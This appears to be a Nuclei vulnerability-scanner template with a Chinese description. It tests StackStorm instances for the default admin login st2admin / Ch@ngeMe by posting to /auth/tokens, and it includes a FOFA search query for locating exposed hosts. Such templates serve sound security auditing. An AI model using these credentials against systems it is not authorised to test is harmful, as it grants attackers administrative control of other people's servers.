id: stackstorm-default-login

info:
  name: StackStorm 默认口令登录（弱口令）
  author: PaperPen
  severity: high
  description: 该模板通过尝试 StackStorm 的默认管理员账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://github.com/StackStorm/st2-docker
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:stackstorm:stackstorm:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    fofa-query: app="stackstorm"
    product: stackstorm
    vendor: stackstorm
  tags: stackstorm,default-login,vuln

http:
  - raw:
      - |
        POST /auth/tokens HTTP/1.1
        Host: {{BaseURL}}
        Content-Type: application/json
        Authorization: Basic {{base64(username + ':' + password)}}

    attack: pitchfork
    payloads:
      username:
        - st2admin
      password:
        - Ch@ngeMe

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"user":'
          - '"token":'
          - '"expiry":'
        condition: and

      - type: status
        status:
          - 201
